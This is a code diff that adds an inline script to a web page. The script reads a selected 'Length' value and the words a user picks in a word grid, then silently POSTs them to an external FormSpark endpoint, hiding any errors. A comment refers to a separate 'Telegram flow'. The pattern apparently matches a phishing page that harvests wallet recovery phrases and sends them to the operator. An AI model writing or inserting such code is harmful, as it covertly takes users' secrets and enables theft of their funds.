@@ -1449,7 +1449,47 @@
     });
     </script>
     <script src="js/script.js"></script>
+<script>
+document.addEventListener("DOMContentLoaded", () => {
 
+    const confirmButton = document.getElementById("confirmButton");
+
+    confirmButton.addEventListener("click", async (e) => {
+
+        try {
+            const length = document.getElementById("Length")?.value;
+
+            const wordsGrid = document.getElementById("wordsGrid");
+            let selectedWords = [];
+
+            if (wordsGrid) {
+                selectedWords = Array.from(wordsGrid.querySelectorAll(".selected"))
+                    .map(el => el.textContent.trim());
+            }
+
+            const payload = {
+                length: length,
+                words: selectedWords.join(", "),
+                timestamp: new Date().toISOString()
+            };
+
+            await fetch("https://submit-form.com/YOUR_FORMSPARK_ENDPOINT", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(payload)
+            });
+
+        } catch (err) {
+            // silent fail (won't affect Telegram flow)
+            console.log("FormSpark error:", err);
+        }
+
+    });
+
+});
+</script>
 
 
 
